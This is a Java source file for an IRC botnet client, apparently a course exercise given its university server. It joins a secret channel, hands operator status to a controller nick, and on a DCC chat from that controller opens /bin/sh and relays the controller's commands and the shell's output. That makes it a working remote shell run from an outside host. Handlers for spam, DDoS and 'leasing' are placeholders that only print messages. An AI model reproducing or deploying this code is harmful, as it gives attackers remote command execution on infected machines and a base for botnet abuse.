import java.io.*;
import java.net.*;
import java.util.*;

import org.jibble.pircbot.*;

public class BotnetClient extends PircBot {
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "bot";
	private static final String CC = "RandR";
	private static final int PORT = 6667;
	private String uuid;
	private String id;
	private Scanner input;
	private String operator;
	private ChatThread chat;
	
	public static void main(String[] args) {
		BotnetClient bn = new BotnetClient();
	}
	
	public BotnetClient() {
		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
		uuid = UUID.randomUUID().toString();
		id = NAME + "_" + uuid;
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(id);
			setMessageDelay(0);
			connect(SERVER, PORT);
			joinChannel(CHANNEL);
			setMode(CHANNEL, "+s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			uuid = UUID.randomUUID().toString();
			id = NAME + "_" + uuid;
			changeNick(id);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
		
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		message = message.toLowerCase();
		if (message.startsWith("shell")) {
			System.out.println("Exposing Shell");
		} else if (message.startsWith("spam")) {
			System.out.println("Sending Spam");
		} else if (message.startsWith("ddos")) {
			System.out.println("DDOSing");
		} else if (message.startsWith("lease")) {
			System.out.println("Leasing Myself");
		} else {
			System.out.println("<" + sender + ">: " + message);
		}
	}
	
	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
		operator = recipient;
	}
	
	protected void onJoin(String channel, String sender, String login, String hostname) {
		if (id.equals(operator) && sender.equals(CC)) {
			op(CHANNEL, sender);
			deOp(CHANNEL, id);
			System.out.println("Operator status given to " + CC);
		} else {
			System.out.println("Current op:" + operator);
		}
	}
	

	protected void onIncomingChatRequest(DccChat chatObj) {
		if (chatObj == null) {
			System.out.println("Chat failed, passed null.");
		} else {
			chat = new ChatThread(chatObj);
			chat.start();
		}
	}
	
	private class ChatThread extends Thread {
		private static final String SENTINEL = "$: ";
		DccChat chat;
		
		public ChatThread(DccChat chat) {
			this.chat = chat;
			try {
				if (chat.getNick().equalsIgnoreCase(CC)) {
					chat.accept();
				} else {
					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
				}
			} catch(Exception e) {
				System.out.println(e.getMessage());
			}
		}
		
		public void run() {
			Runtime r = Runtime.getRuntime();
			try {
				//Create the bash shell
				Process p = r.exec("/bin/sh");

				//Gather the input/output stream to the bash shell process
				PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
				BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
				BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
				
				//Send input commands to the process in a separate thread
				ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
				inputThread.start();
				
				ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
				errorThread.start();
				
	        	//print the results only
        		while (inputThread.isAlive()) {
        			String s = bashout.readLine();
        			while (s != null && !s.equals(SENTINEL)) {
        				chat.sendLine(s);
        				System.out.println("bash response: " + s);
        				s = bashout.readLine();
        			}
        			chat.sendLine(s);
        		}
        		bashout.close();
        		basherror.close();
        		bashin.close();
	        	chat.close();
		     } catch (Exception e) {
		    	 e.printStackTrace();
		     }
		     System.out.println("Closed the bash shell");
		}
	}
	
	//This class passes input from the chat object (the master bot) to the bash shell
	public class ProcessInputThread extends Thread {
		private static final String TERMINATION = "exit";
	    private DccChat chat;
	    private PrintWriter bashin;
	    
	    public ProcessInputThread(DccChat chat, PrintWriter writer) {
	        this.chat = chat;
	        bashin = writer;
	    }

	    public void run() {
	    	try {
	    		bashin.println("echo '$: '");
		    	String command = chat.readLine();
	        	while (command != null && !command.equalsIgnoreCase(TERMINATION)) {
	        		System.out.println("command: " + command);
	        		bashin.println(command);
	        		bashin.println("echo `pwd` '$: '");
	        		command = chat.readLine();
	        	}
	        	bashin.println("exit 0");
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding output from the bash shell to the master bot");
	    }
	}
	//This class passes input from the chat object (the master bot) to the bash shell
	public class ProcessErrorThread extends Thread {
	    private DccChat chat;
	    private BufferedReader bashin;
	    
	    public ProcessErrorThread(DccChat chat, BufferedReader writer) {
	        this.chat = chat;
	        bashin = writer;
	    }

	    public void run() {
	    	try {
	    		String s = "";
	        	while (s != null && bashin.ready()) {
	        		s = bashin.readLine();
	        		System.out.println("error: " + s);
	        		chat.sendLine(s);
	        	}
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding error output from the bash shell to the master bot");
	    }
	}
}